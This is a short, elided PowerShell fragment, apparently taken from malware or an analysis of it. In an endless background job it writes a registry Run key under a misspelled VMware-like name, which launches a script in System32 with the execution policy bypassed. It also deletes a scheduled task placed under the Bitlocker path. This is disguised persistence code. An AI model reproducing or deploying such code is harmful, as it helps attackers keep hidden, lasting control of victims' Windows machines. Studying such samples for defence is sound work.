...
start-job -ScriptBlock { 
    while(1 -eq 1){
        try{ 
            ...
            Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "VMWareDisplayAdapater-2.52" -Value "powershell.exe -file c:\Windows\System32\VMWareDisplayAdapter.ps1 -executionpolicy bypass -Force"
            Unregister-ScheduledTask -TaskPath \Microsoft\Windows\Bitlocker -TaskName "EventLog Rotater"  -Confirm:$false 
            $action = @()
